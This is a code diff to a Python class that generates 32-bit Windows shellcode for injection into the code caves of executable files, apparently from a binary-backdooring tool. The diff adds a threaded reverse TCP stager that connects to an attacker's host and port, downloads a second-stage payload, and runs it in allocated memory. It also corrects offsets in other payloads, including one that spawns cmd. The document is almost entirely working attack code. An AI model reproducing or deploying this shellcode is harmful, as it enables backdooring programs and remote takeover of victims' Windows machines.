@@ -67,7 +67,7 @@ class winI32_shellcode():
 
     def clean_caves_stub(self, CavesToFix):
         stub = ("\x33\xC0"          # XOR EAX,EAX
-                "\x64\x8B\x49\x30"  # mov ecx, dword ptr fd: [ecx + 0x30]
+                "\x64\x8B\x49\x30"  # mov ecx, dword ptr fs: [ecx + 0x30]
                 "\x8B\x49\x08"      # mov ecx, dword ptr [ecx+8]
                 "\x8B\xD9"          # mov ebx,ecx
                 )
@@ -182,6 +182,7 @@ class winI32_shellcode():
                             )
 
         # ExitFunc
+        # Just try exitthread...
         self.shellcode2 += ("\x68\x6f\x6e\x00\x00"
                             "\x68\x65\x72\x73\x69"
                             "\x68\x47\x65\x74\x56"  # GetVersion
@@ -212,6 +213,7 @@ class winI32_shellcode():
                             "\x6a\x00"              # push 0
                             "\xff\xd0"              # call eax
                             )
+
         breakupvar = eat_code_caves(flItms, 0, 1)
         #starts the VirtualAlloc/CreateThread section for the PAYLOAD
         self.shellcode1 = "\xFC"  # Cld
@@ -235,7 +237,7 @@ class winI32_shellcode():
         self.shellcode1 += "\x8B\xE9"  # mov EDI, ECX for save keeping
 
         self.shellcode1 += "\xBE"
-        self.shellcode1 += struct.pack("<H", len(self.shellcode2))
+        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
 
         self.shellcode1 += ("\x00\x00"
                             "\x6A\x40"
@@ -308,12 +310,267 @@ class winI32_shellcode():
             else:
                     self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                    len(self.shellcode1) - 3).rstrip("L")), 16))
-        #else:
-        #    self.shellcode1 += "\xEB\x06\x01\x00\x00"
+        else:
+            #    self.shellcode1 += "\xEB\x06\x01\x00\x00"
+            #This needs to be in the statement above
+            self.shellcode1 += "\xe9"
 
-        self.shellcode1 += "\xe9"
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2))
 
-        self.shellcode1 += struct.pack("<I", len(self.shellcode2))
+        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
+        return (self.stackpreserve + self.shellcode1, self.shellcode2)
+
+    def iat_reverse_tcp_stager_threaded(self, flItms, CavesPicked={}):
+        """
+        This module allows for the user to provide a win32 raw/binary
+        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
+        """
+
+        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
+                                 'VirtualAlloc', 'CreateThread']
+
+        for api in flItms['apis_needed']:
+            if api not in flItms:
+                return False
+
+        if self.PORT is None:
+            print ("This payload requires the PORT parameter -P")
+            return False
+
+        if self.HOST is None:
+            print "This payload requires a HOST parameter -H"
+            return False
+
+        flItms['stager'] = True
+
+        #Begin shellcode 2:
+
+        breakupvar = eat_code_caves(flItms, 0, 1)
+
+        if flItms['cave_jumping'] is True:
+            self.shellcode2 = "\xe8"
+            if breakupvar > 0:
+                if len(self.shellcode2) < breakupvar:
+                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
+                                                             len(self.shellcode2) + 46).rstrip("L")), 16))
+                else:
+                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
+                                                             breakupvar + 46).rstrip("L")), 16))
+            else:
+                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
+                                                   len(self.shellcode2) + 39).rstrip("L")), 16))
+        else:
+            self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"
+
+        if flItms['NewCodeCave'] is False:
+            if CavesPicked != {}:
+                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])
+
+            else:
+                self.shellcode2 += "\x41" * 58
+
+        self.shellcode2 += ("\xFC"
+                            "\x60"                          # pushal
+                            "\x89\xe5"                      # mov ebp, esp
+                            "\x31\xd2"                      # xor edx, edx
+                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
+                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
+                            # entry point is now in edx
+                            # IAT entry
+                            )
+        self.shellcode2 += "\xbb"           # mov value below to EBX
+        if flItms['LoadLibraryA'] - (flItms['ImageBase']) < 0:
+            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['ImageBase']) + 1))
+        else:
+            self.shellcode2 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['ImageBase']))
+
+        self.shellcode2 += "\x01\xD3"  # add EBX + EDX
+        self.shellcode2 += "\xb9"  # mov value below to ECX
+
+        if flItms['GetProcAddress'] - (flItms['ImageBase']) < 0:
+            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['ImageBase']) + 1))
+        else:
+            self.shellcode2 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['ImageBase']))
+        self.shellcode2 += "\x01\xD1"  # add ECX + EDX
+        #LoadLibraryA in EBX
+        #GetProcAddress in ECX
+
+        self.shellcode2 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
+                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
+                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
+                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
+                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
+                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
+                            "\x95\x6A\x05\x68")
+        self.shellcode2 += self.pack_ip_addresses()          # HOST
+        self.shellcode2 += "\x68\x02\x00"
+        self.shellcode2 += struct.pack('!H', self.PORT)      # PORT
+        self.shellcode2 += ("\x89\xE2\x6A"
+                            "\x10\x52\x51\x87\xF9\xFF\xD5"
+                            )
+
+        #breakupvar is the distance between codecaves
+        #PART TWO
+        #ESI getprocaddr
+        #EBX loadliba
+        #ESP ptr to sockaddr struct
+        #EDI has the socket
+        self.shellcode2 += ("\x89\xe5"              # mov edp, esp
+                            "\x68\x33\x32\x00\x00"  # push ws2_32
+                            "\x68\x77\x73\x32\x5F"  # ...
+                            "\x54"                  # push esp
+                            "\xFF\x13"              # call dword ptr [ebx]
+                            "\x89\xc1"              # mov ecx, eax
+                            "\x6A\x00"
+                            "\x68\x72\x65\x63\x76"  # recv, 0
+                            "\x54"                  # push esp
+                            "\x51"                  # push ecx
+                            "\xFF\x16"              # call dword ptr [esi]; get handle for recv
+                            #save recv handle off
+                            "\x50"                  # push eax; save revc handle for later
+                            "\x6A\x00"              # push byte 0x0
+                            "\x6A\x04"              # push byte 4
+                            "\x55"                  # push ebp sockaddr struct
+                            "\x57"                  # push edi (saved socket)
+                            "\xff\xD0"              # call eax; recv (s, &dwLength, 4, 0)
+                            #esp now points to recv handle
+                            "\x8b\x34\x24"              # lea esi, [esp]
+                            "\x8b\x6d\x00"          # mov ebp, dword ptr[ebp]
+                            # I don't need loadliba/getprocaddr anymore
+                            "\x31\xd2"                      # xor edx, edx
+                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
+                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
+                            #entry point in EDX
+                            )
+
+        self.shellcode2 += "\xbb"           # mov value below to EBX
+
+        #Put VirtualAlloc in EBX
+        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['ImageBase']) + 1))
+        else:
+            self.shellcode2 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['ImageBase']))
+        self.shellcode2 += "\x01\xD3"  # add EBX + EDX
+        self.shellcode2 += ("\x6a\x40"              # push byte 0x40
+                            "\x68\x00\x10\x00\x00"  # push 0x1000
+                            "\x55"                  # push ebp
+                            "\x6A\x00"              # push byte 0
+                            "\xff\x13"              # Call VirtualAlloc from thunk
+                            # do not need virualalloc anymore
+                            "\x93"                  # xchg ebx, eax
+                            "\x53"                  # push ebx ; mem location (return to it later)
+                            "\x6a\x00"              # push byte 0
+                            "\x55"                  # push ebp ; length
+                            "\x53"                  # push ebx ; current address
+                            "\x57"                  # push edi ; socket
+                            "\xFF\xD6"              # call esi ; recv handle
+                            "\x01\xc3"              # add ebx, eax
+                            "\x29\xc5"              # sub ebp, eax
+                            "\x75\xf3"              # jump back
+                            "\xc3"                  # ret
+                            )
+
+        breakupvar = eat_code_caves(flItms, 0, 1)
+        #starts the VirtualAlloc/CreateThread section for the PAYLOAD
+        self.shellcode1 = "\xFC"  # Cld
+        self.shellcode1 += "\xbb"           # mov value below to EBX
+
+        #Put VirtualAlloc in EBX
+        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+        #Put Create Thread in ECX
+        self.shellcode1 += "\xb9"  # mov value below to ECX
+        if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        else:
+            self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+
+        #Add in memory base
+        self.shellcode1 += "\x01\xD1"  # add ECX + EDX
+        self.shellcode1 += "\x8B\xE9"  # mov EDI, ECX for save keeping
+
+        self.shellcode1 += "\xBE"
+        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
+
+        self.shellcode1 += ("\x6A\x40"
+                            "\x68\x00\x10\x00\x00"
+                            "\x56"
+                            "\x6A\x00")
+        self.shellcode1 += "\xff\x13"                      # call dword ptr [ebx]
+        self.shellcode1 += ("\x89\xC3"
+                            "\x89\xC7"
+                            "\x89\xF1"
+                            )
+
+        if flItms['cave_jumping'] is True:
+            self.shellcode1 += "\xe9"
+            if breakupvar > 0:
+                if len(self.shellcode1) < breakupvar:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
+                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
+                else:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
+                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
+            else:
+                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
+                                                   len(self.shellcode1) - 3)
+        else:
+            self.shellcode1 += "\xeb\x16"  # <--length of shellcode below
+
+        self.shellcode1 += "\x5e"
+        self.shellcode1 += ("\xF2\xA4"
+                            #"\xE8\x20\x00\x00\x00"
+                            # Exit Func  DONT NEED
+                            #"\xBB\xE0\x1D\x2A\x0A"
+                            #"\x68\xA6\x95\xBD\x9D"
+                            #"\xFF\xD5"
+                            #"\x3C\x06"
+                            #"\x7C\x0A"
+                            #"\x80\xFB\xE0"
+                            #"\x75\x05"
+                            #"\xBB\x47\x13\x72\x6F"
+                            #"\x6A\x00"
+                            #"\x53"
+                            #"\xFF\xD5"
+                            #End Exit Func
+                            "\x31\xC0"
+                            "\x50"
+                            "\x50"
+                            "\x50"
+                            "\x53"
+                            "\x50"
+                            "\x50"
+                            #"\x68\x38\x68\x0D\x16"
+                            #"\xFF\xD5"
+                            )
+
+        self.shellcode1 += "\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
+        self.shellcode1 += ("\x58"
+                            "\x61"                  # POP AD
+                            )
+
+        breakupvar = eat_code_caves(flItms, 0, 2)
+        if flItms['cave_jumping'] is True:
+            self.shellcode1 += "\xe9"
+            if breakupvar > 0:
+                if len(self.shellcode1) < breakupvar:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
+                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
+                else:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
+                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
+            else:
+                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
+                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
+        else:
+            #    self.shellcode1 += "\xEB\x06\x01\x00\x00"
+            #This needs to be in the statement above
+            self.shellcode1 += "\xe9"
+
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2))
 
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
         return (self.stackpreserve + self.shellcode1, self.shellcode2)
@@ -405,7 +662,7 @@ class winI32_shellcode():
                            "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                            "\x5D\x90"
                            "\xBE")
-        self.shellcode1 += struct.pack("<I", len(self.shellcode2) + 5)   # \x22\x01\x00\x00"  # <---Size of shellcode2 in hex
+        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)   # \x22\x01\x00\x00"  # <---Size of shellcode2 in hex
         self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                             "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                             "\x89\xF1"
@@ -547,7 +804,7 @@ class winI32_shellcode():
                            "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                            "\x5D\x90"
                            "\xBE")
-        self.shellcode1 += struct.pack("<I", len(self.shellcode2) + 5)
+        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
 
         self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                             "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
@@ -592,11 +849,11 @@ class winI32_shellcode():
             else:
                     self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                    len(self.shellcode1) - 3).rstrip("L")), 16))
-        #else:
-        #    self.shellcode1 += "\xEB\x06\x01\x00\x00"
-
-        self.shellcode1 += "\xe9"
-        self.shellcode1 += struct.pack("<I", len(self.shellcode2))
+        else:
+            #    self.shellcode1 += "\xEB\x06\x01\x00\x00"
+            #This needs to be in the above statement
+            self.shellcode1 += "\xe9"
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2))
 
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
         return (self.stackpreserve + self.shellcode1, self.shellcode2)
@@ -691,7 +948,7 @@ class winI32_shellcode():
                            )
 
         self.shellcode1 += "\xBE"
-        self.shellcode1 += struct.pack("<H", len(self.shellcode2) + 5)
+        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
         self.shellcode1 += "\x00\x00"  # <---Size of shellcode2 in hex
         self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                             "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
@@ -738,8 +995,7 @@ class winI32_shellcode():
                                                              len(self.shellcode1) - 3).rstrip("L")), 16))
         else:
             self.shellcode1 += "\xE9"
-            self.shellcode1 += struct.pack("<H", len(self.shellcode2))
-            self.shellcode1 += "\x00\x00"
+            self.shellcode1 += struct.pack("<I", len(self.shellcode2))
 
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
         return (self.stackpreserve + self.shellcode1, self.shellcode2)
@@ -878,7 +1134,8 @@ class winI32_shellcode():
                     self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                    len(self.shellcode1) - 3)
 
-        self.shellcode2 = ("\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C"
+        self.shellcode2 = (#"\x85\xC0\x74\x00 # test eax, eax ; je next instruction (don't need this)
+                           "\x6A\x00\x68\x65\x6C"
                            "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
                            "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
                            "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
@@ -901,7 +1158,6 @@ class winI32_shellcode():
         """
 
         flItms['stager'] = True
-        flItms['stub'] = True
 
         if self.PORT is None:
             print ("This payload requires the PORT parameter -P")
@@ -1032,3 +1288,7 @@ class winI32_shellcode():
 
         self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
         return (self.stackpreserve + self.shellcode1, self.shellcode2)
+
+##########################################################
+#                END win32 shellcodes                    #
+##########################################################
